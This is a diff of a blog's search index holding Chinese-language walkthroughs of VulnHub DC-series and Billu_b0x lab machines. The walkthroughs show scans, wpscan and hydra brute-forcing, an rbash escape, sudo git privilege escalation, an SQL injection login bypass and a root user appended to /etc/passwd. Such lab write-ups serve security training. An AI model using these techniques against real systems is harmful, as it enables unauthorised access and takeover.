@@ -1,106 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DCchallenges2</title>
-    <url>/posts/e4e28081/</url>
-    <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
-<br>
-
-<p>环境</p>
-<blockquote>
-<p>网段 192.168.18.0/24</p>
-<p>kali 192.168.18.131</p>
-<p>靶机 192.168.18.132</p>
-</blockquote>
-<p>扫描网段</p>
-<blockquote>
-<p>sudo nmap -sn 192.168.18.0/24</p>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
-</blockquote>
-<p>扫描靶机开放的端口</p>
-<blockquote>
-<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-</blockquote>
-<p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
-<blockquote>
-<p>sudo vim /etc/hosts</p>
-<p>添加 192.168.18.132 dc-2</p>
-</blockquote>
-<p>再去访问192.168.18.132即可,发现是wordpress</p>
-<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
-<p><img src="/posts/e4e28081/flag1.png"></p>
-<p>用<code>dirb</code>扫一下目录</p>
-<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
-<p>这里也可以用<code>nikto</code></p>
-<p><img src="/posts/e4e28081/nikto1.png"></p>
-<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
-<p><img src="/posts/e4e28081/wpscan1.png"></p>
-<br>
-
-<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
-<br>
-
-<p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
-<br>
-
-<blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#100;&#105;&#103;&#x69;&#46;&#x6e;&#x69;&#x6e;&#x6a;&#x61;">&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#100;&#105;&#103;&#x69;&#46;&#x6e;&#x69;&#x6e;&#x6a;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
-<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
-</blockquote>
-<p>使用wpscan爆破</p>
-<blockquote>
-<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
-<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
-</blockquote>
-<p><img src="/posts/e4e28081/wpscan2.png"></p>
-<p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
-<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
-<p>使用hydra爆破ssh</p>
-<blockquote>
-<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
-<p> 得到账号密码</p>
-<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
-</blockquote>
-<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
-<p>使用<code>cat flag3.txt</code></p>
-<blockquote>
-<p>-rbash: sudo: command not found</p>
-</blockquote>
-<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
-<p><strong>-rbash绕过</strong><br>解决方案 <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/e4e28081/flag3.png"></p>
-<p>得到flag3</p>
-<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
-<blockquote>
-<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
-</blockquote>
-<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
-<blockquote>
-<p>sudo -l</p>
-<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
-</blockquote>
-<p>根据上一个提示 这里的git命令推测可以使用</p>
-<p>考虑git提权 <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
-<blockquote>
-<p>sudo git -p –help</p>
-</blockquote>
-<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
-<p><strong>总结</strong></p>
-<ul>
-<li> rbash绕过</li>
-<li> git提权</li>
-</ul>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AoiAWD环境搭建</title>
     <url>/posts/622384de/</url>
     <content><![CDATA[<p>111</p>
@@ -235,6 +135,106 @@
       </tags>
   </entry>
   <entry>
+    <title>DCchallenges2</title>
+    <url>/posts/e4e28081/</url>
+    <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
+<br>
+
+<p>环境</p>
+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.132</p>
+</blockquote>
+<p>扫描网段</p>
+<blockquote>
+<p>sudo nmap -sn 192.168.18.0/24</p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
+</blockquote>
+<p>扫描靶机开放的端口</p>
+<blockquote>
+<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+</blockquote>
+<p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
+<blockquote>
+<p>sudo vim /etc/hosts</p>
+<p>添加 192.168.18.132 dc-2</p>
+</blockquote>
+<p>再去访问192.168.18.132即可,发现是wordpress</p>
+<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
+<p><img src="/posts/e4e28081/flag1.png"></p>
+<p>用<code>dirb</code>扫一下目录</p>
+<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
+<p>这里也可以用<code>nikto</code></p>
+<p><img src="/posts/e4e28081/nikto1.png"></p>
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
+<p><img src="/posts/e4e28081/wpscan1.png"></p>
+<br>
+
+<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
+<br>
+
+<p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
+<br>
+
+<blockquote>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#x6f;&#x62;&#105;&#110;&#64;&#x64;&#x69;&#103;&#x69;&#x2e;&#x6e;&#x69;&#110;&#106;&#97;">&#x72;&#x6f;&#x62;&#105;&#110;&#64;&#x64;&#x69;&#103;&#x69;&#x2e;&#x6e;&#x69;&#110;&#106;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
+</blockquote>
+<p>使用wpscan爆破</p>
+<blockquote>
+<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
+<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
+</blockquote>
+<p><img src="/posts/e4e28081/wpscan2.png"></p>
+<p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
+<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
+<p>使用hydra爆破ssh</p>
+<blockquote>
+<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
+<p> 得到账号密码</p>
+<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
+</blockquote>
+<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
+<p>使用<code>cat flag3.txt</code></p>
+<blockquote>
+<p>-rbash: sudo: command not found</p>
+</blockquote>
+<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
+<p><strong>-rbash绕过</strong><br>解决方案 <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/e4e28081/flag3.png"></p>
+<p>得到flag3</p>
+<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
+<blockquote>
+<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
+</blockquote>
+<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
+<blockquote>
+<p>sudo -l</p>
+<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
+</blockquote>
+<p>根据上一个提示 这里的git命令推测可以使用</p>
+<p>考虑git提权 <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
+<blockquote>
+<p>sudo git -p –help</p>
+</blockquote>
+<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
+<p><strong>总结</strong></p>
+<ul>
+<li> rbash绕过</li>
+<li> git提权</li>
+</ul>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Billu_b0x</title>
     <url>/posts/827ecdf7/</url>
     <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
@@ -318,7 +318,7 @@
 <p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
 <h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
 <p>这里传马多次都没传成功，有时间再试试吧….</p>
-<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#56;&#x2e;&#x31;&#x34;&#52;">&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#56;&#x2e;&#x31;&#x34;&#52;</a>成功登录root用户</p>
+<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#49;&#56;&#46;&#49;&#52;&#52;">&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#49;&#56;&#46;&#49;&#52;&#52;</a>成功登录root用户</p>
 <p>Reference</p>
 <blockquote>
 <p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
@@ -393,8 +393,8 @@
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#x6a;&#x69;&#x6d;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#56;&#46;&#49;&#x33;&#x35;">&#x6a;&#x69;&#x6d;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#56;&#46;&#49;&#x33;&#x35;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;">&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#109;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#56;&#46;&#49;&#x33;&#53;">&#106;&#105;&#109;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#56;&#46;&#49;&#x33;&#53;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#105;&#x6d;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#49;&#56;&#46;&#x31;&#51;&#53;">&#x6a;&#105;&#x6d;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#49;&#56;&#46;&#x31;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
 <p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
 <p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
@@ -442,7 +442,7 @@
 <p>Mamor:x:0:0:::/bin/bash</p>
 <p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;">&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#97;&#109;&#111;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;">&#x4d;&#97;&#109;&#111;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#109;&#x6f;&#x72;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#x35;">&#77;&#97;&#109;&#x6f;&#x72;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#x35;</a>‘s password: </p>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#x61;&#109;&#111;&#x72;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x38;&#x2e;&#49;&#x33;&#x35;">&#77;&#x61;&#109;&#111;&#x72;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x38;&#x2e;&#49;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#49;&#56;&#x2e;&#x31;&#51;&#x35;">&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#49;&#56;&#x2e;&#x31;&#51;&#x35;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#109;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#49;&#56;&#46;&#x31;&#x33;&#53;">&#77;&#97;&#109;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#49;&#56;&#46;&#x31;&#x33;&#53;</a>‘s password: </p>
 <p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
@@ -565,134 +565,6 @@
 <br>
 
 <p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DCchallenges7</title>
-    <url>/posts/9488740e/</url>
-    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段        192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.140</p>
-</blockquote>
-<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
-<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
-<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
-</blockquote>
-<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
-</blockquote>
-<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
-<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
-</blockquote>
-<br>
-
-<p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
-<h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
-<p>Welcome to DC-7</p>
-<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
-<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
-<p>What you will have to do, is to think “outside” the box.</p>
-<p>Way “outside” the box.  :-)</p>
-</blockquote>
-<blockquote>
-<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。—-)<br>虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。<br>你要做的是，想“外面”的盒子。<br>“外面”的盒子。—-)</p>
